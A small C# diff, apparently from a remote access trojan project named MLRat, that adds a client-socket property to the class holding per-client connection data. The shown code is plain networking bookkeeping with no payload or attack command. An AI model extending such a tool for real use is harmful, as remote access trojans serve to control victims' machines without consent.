@@ -11,10 +11,12 @@ namespace MLRat.Networking
         public object DisplayObject { get; set; }
         public Guid ID { get; private set; }
         public bool Handshaken { get; set; }
-        public MLClientData(Guid _id)
+        public eSock.Server.eSockClient ClientSocket { get; private set; }
+        public MLClientData(Guid _id, eSock.Server.eSockClient _socket)
         {
             ID = _id;
             Handshaken = false;
+            ClientSocket = _socket;
         }
         
     }
